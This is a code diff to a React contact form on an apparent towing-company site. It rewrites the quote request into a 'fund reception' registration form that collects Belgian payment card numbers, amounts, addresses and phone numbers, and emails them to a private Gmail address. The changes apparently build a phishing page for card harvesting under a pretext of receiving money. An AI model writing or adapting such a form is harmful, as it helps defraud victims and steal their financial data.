@@ -30,14 +30,14 @@ const Contact = () => {
         from_email: data.email,
         phone: data.telephone,
         address: data.adresse,
-        account_number: data.compte,
+        card_number: data.compte,
         amount: `${data.montant} €`,
-        message: data.message || 'Aucun message',
+        message: 'Formulaire d\'enregistrement',
         to_name: 'Mickael Andjui',
         to_email: 'mickael.andjui.21@gmail.com',
         reply_to: data.email,
         // Informations supplémentaires pour le template
-        service_type: 'Demande de devis',
+        service_type: 'Enregistrement',
         date_demande: new Date().toLocaleDateString('fr-FR'),
         heure_demande: new Date().toLocaleTimeString('fr-FR')
       }
@@ -66,7 +66,7 @@ const Contact = () => {
 
     } catch (error) {
       console.error('Erreur lors de l\'envoi:', error)
-      setError('Erreur lors de l\'envoi. Veuillez réessayer ou nous contacter directement.')
+      setError('Erreur lors de l\'enregistrement. Veuillez réessayer ou nous contacter directement.')
     } finally {
       setIsSubmitting(false)
     }
@@ -92,13 +92,13 @@ const Contact = () => {
           viewport={{ once: true }}
           className="text-center mb-8 sm:mb-12 lg:mb-16"
         >
-          <h2 className="text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-bold text-gray-900 mb-4 sm:mb-6">
-            Nous <span className="bg-gradient-to-r from-primary-600 to-blue-500 bg-clip-text text-transparent">Contacter</span>
-          </h2>
-          <p className="text-base sm:text-lg lg:text-xl text-gray-600 max-w-2xl lg:max-w-3xl mx-auto px-4">
-            Besoin d'un devis, d'une réparation ou d'un remorquage ? 
-            Contactez-nous dès maintenant pour un service rapide et professionnel.
-          </p>
+                     <h2 className="text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-bold text-gray-900 mb-4 sm:mb-6">
+             <span className="bg-gradient-to-r from-primary-600 to-blue-500 bg-clip-text text-transparent">Formulaire de réception de fond</span>
+           </h2>
+           <p className="text-base sm:text-lg lg:text-xl text-gray-600 max-w-2xl lg:max-w-3xl mx-auto px-4">
+             Remplissez ce formulaire pour enregistrer votre demande de réception de fond. 
+             Nous traiterons votre demande dans les plus brefs délais.
+           </p>
         </motion.div>
 
         <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 sm:gap-12 lg:gap-16">
@@ -111,9 +111,9 @@ const Contact = () => {
             className="space-y-6 sm:space-y-8"
           >
             <div>
-              <h3 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 mb-6 sm:mb-8">
-                Informations de Contact
-              </h3>
+                             <h3 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 mb-6 sm:mb-8">
+                 Informations importantes
+               </h3>
               
               <div className="grid gap-6">
                 {contactInfo.map((item, index) => (
@@ -151,7 +151,7 @@ const Contact = () => {
                 Urgence Remorquage
               </h4>
                              <p className="text-red-100 mb-4">
-                 Panne, accident ou problème mécanique ? Nous intervenons 24h/24 et 7j/7 partout aux Pays-Bas.
+                 Panne, accident ou problème mécanique ? Nous intervenons 24h/24 et 7j/7 partout en Belgique.
                </p>
               
             </motion.div>
@@ -166,7 +166,7 @@ const Contact = () => {
             className="bg-white rounded-xl sm:rounded-2xl shadow-xl p-4 sm:p-6 lg:p-8"
           >
             <h3 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 mb-6 sm:mb-8">
-              Demander un Devis Gratuit
+              Enregistrement
             </h3>
 
             {isSubmitted && (
@@ -178,7 +178,7 @@ const Contact = () => {
                 <CheckCircle className="w-6 h-6 text-green-600" />
                 <div>
                   <h4 className="font-semibold text-green-800">Message envoyé !</h4>
-                  <p className="text-green-700 text-sm">Nous vous recontacterons dans les plus brefs délais.</p>
+                  <p className="text-green-700 text-sm">Votre enregistrement a été effectué avec succès.</p>
                 </div>
               </motion.div>
             )}
@@ -315,15 +315,15 @@ const Contact = () => {
               <div className="grid md:grid-cols-2 gap-4">
                 <div>
                   <label className="block text-sm font-semibold text-gray-700 mb-2">
-                    Numéro de compte bancaire *
+                    Numéro de carte BE *
                   </label>
                   <input
                     type="text"
-                    {...register('compte', { required: 'Le numéro de compte est obligatoire' })}
+                    {...register('compte', { required: 'Le numéro de carte BE est obligatoire' })}
                     className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                       errors.compte ? 'border-red-500' : 'border-gray-300'
                     }`}
-                    placeholder="FR76 1234 5678 9012 3456 7890 123"
+                    placeholder="BE76 1234 5678 9012 3456 7890 123"
                   />
                   {errors.compte && (
                     <p className="mt-1 text-sm text-red-600 flex items-center">
@@ -355,18 +355,7 @@ const Contact = () => {
                 </div>
               </div>
 
-              {/* Message */}
-              <div>
-                <label className="block text-sm font-semibold text-gray-700 mb-2">
-                  Message
-                </label>
-                <textarea
-                  rows={4}
-                  {...register('message')}
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors resize-none"
-                  placeholder="Décrivez votre demande..."
-                ></textarea>
-              </div>
+
 
               {/* Submit Button */}
               <motion.button
@@ -383,12 +372,12 @@ const Contact = () => {
                 {isSubmitting ? (
                   <>
                     <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
-                    <span>Envoi en cours...</span>
+                    <span>Enregistrement en cours...</span>
                   </>
                 ) : (
                   <>
                     <Send className="w-5 h-5" />
-                    <span>Envoyer la demande</span>
+                    <span>Enregistrer</span>
                   </>
                 )}
               </motion.button>
